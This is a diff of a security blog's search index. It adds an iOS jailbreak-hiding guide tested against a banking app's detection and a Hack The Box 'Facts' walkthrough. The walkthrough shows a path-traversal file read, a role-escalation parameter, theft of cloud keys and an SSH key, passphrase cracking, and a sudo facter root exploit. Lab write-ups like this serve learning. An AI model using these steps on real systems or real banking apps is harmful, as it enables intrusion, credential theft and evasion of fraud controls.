@@ -64,9 +64,269 @@
       </tags>
   </entry>
   <entry>
+    <title>iOS越狱隐藏</title>
+    <url>/posts/6d3db75c.html</url>
+    <content><![CDATA[<style>.pzkagbnaoxjk{zoom:50%;}</style><img src="/posts/6d3db75c/image-20260410151632410.png" class="pzkagbnaoxjk" alt="越狱">
+
+<span id="more"></span>
+
+<h3 id="安装GTA-Car-Tracker"><a href="#安装GTA-Car-Tracker" class="headerlink" title="安装GTA Car Tracker"></a>安装GTA Car Tracker</h3><p>使用safari浏览器访问 <span class="exturl" data-url="aHR0cHM6Ly9hcGkuamFpbGJyZWFrcy5hcHAvdHJvbGw2NGU=">https://api.jailbreaks.app/troll64e<i class="fa fa-external-link-alt"></i></span> ，弹出iTunes 打开，点击打开，选择安装</p>
+<style>.zjmmbfrmotst{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0003-0270768.PNG" class="zjmmbfrmotst" alt="IMG_0003"><style>.soelvkrpujys{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0004.PNG" class="soelvkrpujys" alt="IMG_0004">
+
+<style>.kkotqcmwjyrj{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0005.PNG" class="kkotqcmwjyrj" alt="IMG_0005"><style>.kdspeyeoxvsw{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0006.PNG" class="kdspeyeoxvsw" alt="IMG_0006">
+
+<h3 id="安装TrollStore"><a href="#安装TrollStore" class="headerlink" title="安装TrollStore"></a>安装TrollStore</h3><p>打开GTA Car Tracker 安装 TrollStore</p>
+<style>.gfxercgtjxyt{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0007.PNG" class="gfxercgtjxyt" alt="IMG_0007"><style>.nkxnevwntetf{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0008.PNG" class="nkxnevwntetf" alt="IMG_0008">
+
+<p>打开TrollStore 安装Idid，Persistence Helper (可选，安装后重启TrollStore不失效) </p>
+<style>.oqyvxxttltht{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0010.PNG" class="oqyvxxttltht" alt="IMG_0010">  
+
+
+
+<h3 id="安装RootHide-Dopamine"><a href="#安装RootHide-Dopamine" class="headerlink" title="安装RootHide Dopamine"></a>安装RootHide Dopamine</h3><p>访问 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Jvb3RoaWRlL0RvcGFtaW5lMi1yb290aGlkZQ==">https://github.com/roothide/Dopamine2-roothide<i class="fa fa-external-link-alt"></i></span> 下载最新版的    Dopamine.tipa  放到iPhone 的Download 目录下然后使用TrollStore安装；打开TrollStore，右上角 “+” ，选中要安装的Dopamine.tipa ，然后安装</p>
+<style>.wmnqghxjgrnk{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0011.PNG" class="wmnqghxjgrnk" alt="IMG_0011"> 
+
+<h3 id="越狱和隐藏越狱"><a href="#越狱和隐藏越狱" class="headerlink" title="越狱和隐藏越狱"></a>越狱和隐藏越狱</h3><p>打开Dopamine，然后点击最下面越狱，选择安装Sileo或者全选，越狱完成，桌面会出现RootHide (如果没有可以到Sileo 里搜索安装)</p>
+<style>.lgsvdytuchye{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0012.PNG" class="lgsvdytuchye" alt="IMG_0012"><style>.bgimuqyumdyb{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0013.PNG" class="bgimuqyumdyb" alt="IMG_0013">
+
+
+
+<p>打开RootHide，点击var 清理，左上角选择全部，点击右上角清理</p>
+<style>.tpfwfilsuenn{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0014.PNG" class="tpfwfilsuenn" alt="IMG_0014"> 
+
+<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>重新下载安装app，并将app 加入黑名单；使用某银行app测试效果；</p>
+<h4 id="未打开黑名单无法正常使用-app"><a href="#未打开黑名单无法正常使用-app" class="headerlink" title="未打开黑名单无法正常使用 app"></a>未打开黑名单无法正常使用 app</h4><style>.tvsemilsshcw{zoom: 37%;}</style><img src="/posts/6d3db75c/image-20260205144231485.png" class="tvsemilsshcw" alt="image-20260205144231485"><style>.kkpcrhbbxhsb{zoom:25%;}</style><img src="/posts/6d3db75c/IMG_0017.PNG" class="kkpcrhbbxhsb" alt="IMG_0017">
+
+<h4 id="打开黑名单后app正常"><a href="#打开黑名单后app正常" class="headerlink" title="打开黑名单后app正常"></a>打开黑名单后app正常</h4><style>.tiaymxiyffed{zoom: 37%;}</style><img src="/posts/6d3db75c/image-20260205144409713.png" class="tiaymxiyffed" alt="image-20260205144409713"><style>.fwmemkfoprsw{zoom: 25%;}</style><img src="/posts/6d3db75c/IMG_0019.PNG" class="fwmemkfoprsw" alt="IMG_0019">
+
+
+
+]]></content>
+      <categories>
+        <category>移动端安全</category>
+      </categories>
+      <tags>
+        <tag>越狱</tag>
+        <tag>bypass</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB-Facts</title>
+    <url>/posts/a66eeeb7.html</url>
+    <content><![CDATA[<style>.lyekchgdvjzo{zoom:50%;}</style><img src="/posts/a66eeeb7/bdcd209c32f156fbfb2268f099971f75.png" class="lyekchgdvjzo" alt="HTB-facts">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Linux</td>
+<td>Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.129</span>.16.180 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-Pn</span>     
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2026</span>-04-09 <span class="token number">13</span>:42 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.129</span>.16.180
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">997</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>
+PORT   STATE SERVICE VERSION
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">9</span>.9p1 Ubuntu 3ubuntu3.2 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token number">53</span>/tcp <span class="token function">open</span>  domain  Unbound
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http    nginx <span class="token number">1.26</span>.3 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">27.51</span> seconds</code></pre>
+
+<p>添加本地解析</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.129.16.180 facts.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>
+
+<h3 id="FFUF-Scan"><a href="#FFUF-Scan" class="headerlink" title="FFUF Scan"></a>FFUF Scan</h3><p>枚举目录，发现admin </p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /opt/secLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> <span class="token string">'http://facts.htb/FUZZ'</span> <span class="token parameter variable">-ic</span> <span class="token parameter variable">-t</span> <span class="token number">100</span> 
+
+        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
+       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
+       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
+        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
+         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
+          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           <span class="token builtin class-name">:</span> GET
+ :: URL              <span class="token builtin class-name">:</span> http://facts.htb/FUZZ
+ :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /opt/secLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
+ :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
+ :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
+ :: Threads          <span class="token builtin class-name">:</span> <span class="token number">100</span>
+ :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
+________________________________________________
+
+index                   <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">11113</span>, Words: <span class="token number">1328</span>, Lines: <span class="token number">125</span>, Duration: 422ms<span class="token punctuation">]</span>
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+admin                   <span class="token punctuation">[</span>Status: <span class="token number">302</span>, Size: <span class="token number">0</span>, Words: <span class="token number">1</span>, Lines: <span class="token number">1</span>, Duration: 4170ms<span class="token punctuation">]</span>
+post                    <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">11308</span>, Words: <span class="token number">1414</span>, Lines: <span class="token number">152</span>, Duration: 7738ms<span class="token punctuation">]</span>
+ajax                    <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">0</span>, Words: <span class="token number">1</span>, Lines: <span class="token number">1</span>, Duration: 4216ms<span class="token punctuation">]</span>
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>
+
+<p>访问admin 发现后台</p>
+<img src="/posts/a66eeeb7/image-20260409135635326.png" class="" title="后台">
+
+<p>注册账号试试，发现可以注册并且登录</p>
+<img src="/posts/a66eeeb7/image-20260409135832986.png" class="" title="注册">
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>登录后台可以找到cms 信息和版本，根据信息检索到 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FmaWZ1ZGlubXRvcC9DYW1hbGVvbi1DTVMtMi45LjAtVnVsbg==">https://github.com/afifudinmtop/Camaleon-CMS-2.9.0-Vuln<i class="fa fa-external-link-alt"></i></span> 有两个CVE CVE-2025-2304和CVE-2024-46987 </p>
+<img src="/posts/a66eeeb7/image-20260409140026432.png" class="" title="image-20260409140026432">
+
+<h3 id="LFI-CVE-2024-46987"><a href="#LFI-CVE-2024-46987" class="headerlink" title="LFI (CVE-2024-46987 )"></a>LFI (CVE-2024-46987 )</h3><p>使用burp 请求 <code>admin/media/download_private_file?file=../../../../../../etc/passwd</code>可以获取到&#x2F;etc&#x2F;passwd，通过LFI可以直接读取flag</p>
+<img src="/posts/a66eeeb7/image-20260409141045188.png" class="" title="LFI">
+
+
+
+<img src="/posts/a66eeeb7/image-20260409140852202.png" class="" title="flag">
+
+
+
+<h3 id="权限提升-CVE-CVE-2025-2304"><a href="#权限提升-CVE-CVE-2025-2304" class="headerlink" title="权限提升(CVE CVE-2025-2304)"></a>权限提升(CVE CVE-2025-2304)</h3><p>点击”Change Password”, 输入新密码，抓包，添加<code>&amp;password[role]=admin</code> ，之后刷新页面，可以看到提升到管理员后台</p>
+<img src="/posts/a66eeeb7/image-20260409141918732.png" class="" title="提权">
+
+
+
+<img src="/posts/a66eeeb7/image-20260409142148020.png" class="" title="提权">
+
+
+
+<img src="/posts/a66eeeb7/image-20260409142230901.png" class="" title="管理员后台">
+
+<p>在后台配置中可以找到AWS 的密钥配置</p>
+<img src="/posts/a66eeeb7/image-20260409142740630.png" class="" title="aws">
+
+<h3 id="SSH-登录"><a href="#SSH-登录" class="headerlink" title="SSH 登录"></a>SSH 登录</h3><p>安装aws   <code>curl &quot;https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip&quot; -o &quot;awscliv2.zip&quot;</code>   </p>
+<p>配置aws 并连接，在.ssh 目录下可以获取到 id_ed25519</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ aws configure                                                             
+
+Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the <span class="token builtin class-name">command</span> <span class="token string">'aws login'</span><span class="token builtin class-name">.</span>
+
+AWS Access Key ID <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: AKIA9<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>FAD15D5
+AWS Secret Access Key <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: ZrwidjEG<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>y5v1gCextPZRLWU
+Default region name <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: us-east-1
+Default output <span class="token function">format</span> <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: 
+
+$ aws s3 <span class="token function">ls</span> --endpoint-url http://facts.htb:54321                          
+<span class="token number">2025</span>-09-11 <span class="token number">20</span>:06:52 internal
+<span class="token number">2025</span>-09-11 <span class="token number">20</span>:06:52 randomfacts
+
+$ aws s3 <span class="token function">ls</span> s3://internal/ --endpoint-url http://facts.htb:54321  
+                           PRE .bundle/
+                           PRE .cache/
+                           PRE .ssh/
+<span class="token number">2026</span>-01-09 02:45:13        <span class="token number">220</span> .bash_logout
+<span class="token number">2026</span>-01-09 02:45:13       <span class="token number">3900</span> .bashrc
+<span class="token number">2026</span>-01-09 02:47:17         <span class="token number">20</span> .lesshst
+<span class="token number">2026</span>-01-09 02:47:17        <span class="token number">807</span> .profile
+
+$ aws s3 <span class="token function">ls</span> s3://internal/.ssh/ --endpoint-url http://facts.htb:54321  
+<span class="token number">2026</span>-04-09 <span class="token number">13</span>:40:07         <span class="token number">82</span> authorized_keys
+<span class="token number">2026</span>-04-09 <span class="token number">13</span>:40:07        <span class="token number">464</span> id_ed25519
+
+$ aws s3 <span class="token function">cp</span> s3://internal/.ssh/id_ed25519 --endpoint-url http://facts.htb:54321 ./id_ed25519 
+download: s3://internal/.ssh/id_ed25519 to ./id_ed25519             
+</code></pre>
+
+<p>使用john 破解id_ed25519 并使用trivia 账号登录成功，trivia账号在&#x2F;etc&#x2F;passwd 文件中获取</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$python3</span> ssh2john.py id_ed25519 ssh.hash
+
+$./john <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/opt/secLists/rockyou.txt ssh.hash 
+Using default input encoding: UTF-8
+Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>SSH, SSH private key <span class="token punctuation">[</span>MD5/bcrypt-pbkdf/<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>DES/AES <span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
+Cost <span class="token number">1</span> <span class="token punctuation">(</span>KDF/cipher <span class="token punctuation">[</span><span class="token number">0</span>:MD5/AES <span class="token number">1</span>:MD5/<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>DES <span class="token number">2</span>:bcrypt-pbkdf/AES<span class="token punctuation">]</span><span class="token punctuation">)</span> is <span class="token number">2</span> <span class="token keyword">for</span> all loaded hashes
+Cost <span class="token number">2</span> <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is <span class="token number">24</span> <span class="token keyword">for</span> all loaded hashes
+Will run <span class="token number">16</span> OpenMP threads
+Press <span class="token string">'q'</span> or Ctrl-C to abort, <span class="token string">'h'</span> <span class="token keyword">for</span> help, almost any other key <span class="token keyword">for</span> status
+dragonballz      <span class="token punctuation">(</span>id_ed25519<span class="token punctuation">)</span>     
+1g <span class="token number">0</span>:00:00:30 DONE <span class="token punctuation">(</span><span class="token number">2026</span>-04-09 <span class="token number">15</span>:22<span class="token punctuation">)</span> <span class="token number">0</span>.03327g/s <span class="token number">106</span>.5p/s <span class="token number">106</span>.5c/s <span class="token number">106</span>.5C/s adriano<span class="token punctuation">..</span>imissu
+Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+
+$ <span class="token function">chmod</span> <span class="token number">600</span> id_ed25519                                                                                      
+$ <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_ed25519 trivia@facts.htb 
+Enter passphrase <span class="token keyword">for</span> key <span class="token string">'id_ed25519'</span><span class="token builtin class-name">:</span> </code></pre>
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>sudo -l 发现facter，通过检索 <span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5vcmcvZ3Rmb2JpbnMvZmFjdGVyLw==">https://gtfobins.org/gtfobins/facter/<i class="fa fa-external-link-alt"></i></span> 发现目录底下第一个ruby 文件会被执行</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">trivia@facts:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> trivia on facts:
+    env_reset, mail_badpass,
+    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin, use_pty
+
+User trivia may run the following commands on facts:
+    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/facter
+
+trivia@facts:~$ /usr/bin/facter <span class="token parameter variable">-h</span>
+Usage
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+  facter <span class="token punctuation">[</span>options<span class="token punctuation">]</span> <span class="token punctuation">[</span>query<span class="token punctuation">]</span> <span class="token punctuation">[</span>query<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+
+Options
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+           <span class="token punctuation">[</span>--color<span class="token punctuation">]</span>                      Enable color output.
+           <span class="token punctuation">[</span>--no-color<span class="token punctuation">]</span>                   Disable color output.
+        <span class="token parameter variable">-c</span> <span class="token punctuation">[</span>--config<span class="token punctuation">]</span>                     The location of the config file.
+           <span class="token punctuation">[</span>--custom-dir<span class="token punctuation">]</span>                 A directory to use <span class="token keyword">for</span> custom facts.
+        <span class="token parameter variable">-d</span> <span class="token punctuation">[</span>--debug<span class="token punctuation">]</span>                      Enable debug output.
+           <span class="token punctuation">[</span>--external-dir<span class="token punctuation">]</span>               A directory to use <span class="token keyword">for</span> external facts.
+           <span class="token punctuation">[</span>--hocon<span class="token punctuation">]</span>                      Output <span class="token keyword">in</span> Hocon format.
+      <span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+        <span class="token parameter variable">-h</span> <span class="token punctuation">[</span>--help<span class="token punctuation">]</span>                       Help <span class="token keyword">for</span> all arguments
+
+trivia@facts:~$  <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /tmp/exploit
+trivia@facts:~$  <span class="token builtin class-name">cd</span> /tmp/exploit/
+trivia@facts:/tmp/exploit$ <span class="token function">cat</span> <span class="token operator">></span> /tmp/exploit_facts/exp.rb <span class="token operator">&lt;&lt;</span> <span class="token string">'EOF'
+#!/usr/bin/env ruby
+system("chmod +s /bin/bash")
+EOF</span>
+trivia@facts:/tmp/exploit$ <span class="token function">sudo</span> /usr/bin/facter --custom-dir<span class="token operator">=</span>/tmp/exploit/ x
+trivia@facts:/tmp/exploit$ <span class="token function">bash</span> <span class="token parameter variable">-p</span>
+bash-5.2<span class="token comment"># cat /root/root.txt</span></code></pre>
+
+
+
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>flag1</td>
+<td>&#x2F;home&#x2F;william&#x2F;user.txt</td>
+</tr>
+<tr>
+<td>flag2</td>
+<td>&#x2F;root&#x2F;root.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>LFI</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-Imagery</title>
     <url>/posts/3872553c.html</url>
-    <content><![CDATA[<style>.scrxkoriobdl{zoom:50%;}</style><img src="/posts/3872553c/image-20251004154017644.png" class="scrxkoriobdl" alt="HTB-Imagery">
+    <content><![CDATA[<style>.oveipsluodux{zoom:50%;}</style><img src="/posts/3872553c/image-20251004154017644.png" class="oveipsluodux" alt="HTB-Imagery">
 
 <span id="more"></span>
 
@@ -135,7 +395,7 @@ Dictionary cache hit:
 
 2c65c8d7bfbca32a3ed42596192384f6:iambatman                                                                </code></pre>
 
-<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>使用账号<span class="exturl" data-url="bWFpbHRvOiYjeDc0OyYjMTAxOyYjeDczOyYjeDc0OyYjeDc1OyYjMTE1OyYjMTAxOyYjeDcyOyYjeDQwOyYjeDY5OyYjMTA5OyYjOTc7JiMxMDM7JiN4NjU7JiMxMTQ7JiN4Nzk7JiN4MmU7JiMxMDQ7JiMxMTY7JiM5ODs=">testuser@imagery.htb<i class="fa fa-external-link-alt"></i></span> 和破解出的密码登录目标站点，随便上传一张图片，点击<code>Transform Image</code> </p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>使用账号<span class="exturl" data-url="bWFpbHRvOiYjMTE2OyYjMTAxOyYjeDczOyYjMTE2OyYjMTE3OyYjeDczOyYjeDY1OyYjeDcyOyYjeDQwOyYjMTA1OyYjeDZkOyYjeDYxOyYjeDY3OyYjeDY1OyYjeDcyOyYjMTIxOyYjNDY7JiN4Njg7JiN4NzQ7JiM5ODs=">testuser@imagery.htb<i class="fa fa-external-link-alt"></i></span> 和破解出的密码登录目标站点，随便上传一张图片，点击<code>Transform Image</code> </p>
 <img src="/posts/3872553c/image-20251004165324958.png" class="" title="Transform image">
 
 <p>选择Crop，点击<code>Apply Transformation</code> , 抓包修改参数 <code>y</code> </p>
@@ -261,15 +521,15 @@ root</code></pre>
         <category>Hackthebox</category>
       </categories>
       <tags>
-        <tag>XSS</tag>
         <tag>LFI</tag>
+        <tag>XSS</tag>
         <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
     <title>HTB-Expressway</title>
     <url>/posts/84373dcc.html</url>
-    <content><![CDATA[<style>.jolmxuwqhglv{zoom:50%;}</style><img src="/posts/84373dcc/75c168f01f04e5f256838733b77f13ec.png" class="jolmxuwqhglv" alt="HTB-Expressway">
+    <content><![CDATA[<style>.tdhyvnpltijs{zoom:50%;}</style><img src="/posts/84373dcc/75c168f01f04e5f256838733b77f13ec.png" class="tdhyvnpltijs" alt="HTB-Expressway">
 
 <span id="more"></span>
 
@@ -436,7 +696,7 @@ root@expressway:~<span class="token comment"># id</span>
   <entry>
     <title>HTB-Editor</title>
     <url>/posts/fe14f7bb.html</url>
-    <content><![CDATA[<style>.xggbbuscoxks{zoom:50%;}</style><img src="/posts/fe14f7bb/ba9dec0d022d3c3b6a96aa5dba4772c7-1755522406355-3.png" class="xggbbuscoxks" alt="HTB-Editor">
+    <content><![CDATA[<style>.ossqewujwlpt{zoom:50%;}</style><img src="/posts/fe14f7bb/ba9dec0d022d3c3b6a96aa5dba4772c7-1755522406355-3.png" class="ossqewujwlpt" alt="HTB-Editor">
 
 <span id="more"></span>
 
@@ -601,7 +861,7 @@ root@editor:/tmp<span class="token comment"># id</span>
   <entry>
     <title>HTB-Bashed</title>
     <url>/posts/f52f847.html</url>
-    <content><![CDATA[<style>.jpbetarakydw{zoom:50%;}</style><img src="/posts/f52f847/0f058b73659ca043de9f5240abd651ca.png" class="jpbetarakydw" alt="Bashed">
+    <content><![CDATA[<style>.nfruxgmvlvxm{zoom:50%;}</style><img src="/posts/f52f847/0f058b73659ca043de9f5240abd651ca.png" class="nfruxgmvlvxm" alt="Bashed">
 
 <span id="more"></span>
 
@@ -751,7 +1011,7 @@ root@bashed:/scripts<span class="token comment"># id       </span>
   <entry>
     <title>HTB-Irked</title>
     <url>/posts/b88b7678.html</url>
-    <content><![CDATA[<style>.rdwcqdovoyxs{zoom:50%;}</style><img src="/posts/b88b7678/5fb846e75cf0db0c4b27e2dc64a9bf82.png" class="rdwcqdovoyxs">
+    <content><![CDATA[<style>.zhlrljmtqwpo{zoom:50%;}</style><img src="/posts/b88b7678/5fb846e75cf0db0c4b27e2dc64a9bf82.png" class="zhlrljmtqwpo">
 
 <span id="more"></span>
 
@@ -945,7 +1205,7 @@ djmardov@irked:~$ <span class="token function">id</span>
   <entry>
     <title>HTB-Nocturnal</title>
     <url>/posts/5cd9a843.html</url>
-    <content><![CDATA[<style>.qqiqywvoosxq{zoom:50%;}</style><img src="/posts/5cd9a843/f6a56cec6e9826b4ed124fb4155abc66.png" class="qqiqywvoosxq">
+    <content><![CDATA[<style>.ayehvepcjhif{zoom:50%;}</style><img src="/posts/5cd9a843/f6a56cec6e9826b4ed124fb4155abc66.png" class="ayehvepcjhif">
 
 <span id="more"></span>
 
@@ -1368,7 +1628,7 @@ ispconfig-shell<span class="token comment"># cat /root/root.txt</span></code></p
   <entry>
     <title>HTB-Previse</title>
     <url>/posts/21913e3f.html</url>
-    <content><![CDATA[<style>.qgvkygszewbq{zoom:50%;}</style><img src="/posts/21913e3f/e3c542ada4b134e29e534e3081ef9650.png" class="qgvkygszewbq">
+    <content><![CDATA[<style>.klhduzgqolpw{zoom:50%;}</style><img src="/posts/21913e3f/e3c542ada4b134e29e534e3081ef9650.png" class="klhduzgqolpw">
 
 <span id="more"></span>
 
@@ -1596,7 +1856,7 @@ root@previse:/tmp<span class="token comment"># id      </span>
   <entry>
     <title>HTB-Busqueda</title>
     <url>/posts/d91931aa.html</url>
-    <content><![CDATA[<style>.pjxkapfnpkxb{zoom:50%;}</style><img src="/posts/d91931aa/a6942ab57b6a79f71240420442027334.png" class="pjxkapfnpkxb">
+    <content><![CDATA[<style>.ofsqkithcokm{zoom:50%;}</style><img src="/posts/d91931aa/a6942ab57b6a79f71240420442027334.png" class="ofsqkithcokm">
 
 <span id="more"></span>
 
@@ -1857,7 +2117,7 @@ connect to <span class="token punctuation">[</span><span class="token number">10
   <entry>
     <title>HTB-Sauna</title>
     <url>/posts/5551a214.html</url>
-    <content><![CDATA[<style>.yffnfvttypvt{zoom:50%;}</style><img src="/posts/5551a214/f31d5d0264fadc267e7f38a9d7729d14.png" class="yffnfvttypvt">
+    <content><![CDATA[<style>.lnwqdvkladkk{zoom:50%;}</style><img src="/posts/5551a214/f31d5d0264fadc267e7f38a9d7729d14.png" class="lnwqdvkladkk">
 
 <span id="more"></span>
 
@@ -2123,7 +2383,7 @@ nt authority<span class="token punctuation">\</span>system
   <entry>
     <title>HTB-Heist</title>
     <url>/posts/4a8e4133.html</url>
-    <content><![CDATA[<style>.ejpmddfhcple{zoom:50%;}</style><img src="/posts/4a8e4133/131dbaba68b169bd5ff59ac09420b09f.png" class="ejpmddfhcple">
+    <content><![CDATA[<style>.pjrusivkuuvc{zoom:50%;}</style><img src="/posts/4a8e4133/131dbaba68b169bd5ff59ac09420b09f.png" class="pjrusivkuuvc">
 
 <span id="more"></span>
 
@@ -2419,7 +2679,7 @@ Mode                LastWriteTime         Length Name
   <entry>
     <title>HTB-Toolbox</title>
     <url>/posts/96a67a56.html</url>
-    <content><![CDATA[<style>.jbjikedjrlfs{zoom:50%;}</style><img src="/posts/96a67a56/9d218e64149bfb00a002d94868f2e4b1.png" class="jbjikedjrlfs">
+    <content><![CDATA[<style>.knmvgknhtshh{zoom:50%;}</style><img src="/posts/96a67a56/9d218e64149bfb00a002d94868f2e4b1.png" class="knmvgknhtshh">
 
 <span id="more"></span>
 
@@ -2768,7 +3028,7 @@ administrator@TOOLBOX C:<span class="token punctuation">\</span>Users<span class
   <entry>
     <title>HTB-Mirai</title>
     <url>/posts/c3392160.html</url>
